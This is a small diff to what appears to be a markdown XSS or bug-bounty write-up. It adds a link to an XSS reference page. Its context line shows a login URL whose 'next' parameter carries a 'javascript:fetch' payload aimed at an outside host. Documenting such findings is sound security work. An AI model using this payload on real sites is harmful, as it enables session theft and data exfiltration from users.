@@ -142,3 +142,6 @@ https://app.staging.makeswift.com/login?next=javascript%3Afetch(%27https%3A%2F%2
 ![image](https://github.com/user-attachments/assets/d9588aa4-44c3-4ae6-ae9c-07731ae84d9d)
 
 ```
+
+
+- https://www.hahwul.com/cullinan/xss/?fbclid=IwAR1HX06q3yYwG73REvITzA7mshM0egPaGR0PzqbnzW25HE1h4XdPVrA1ZNY
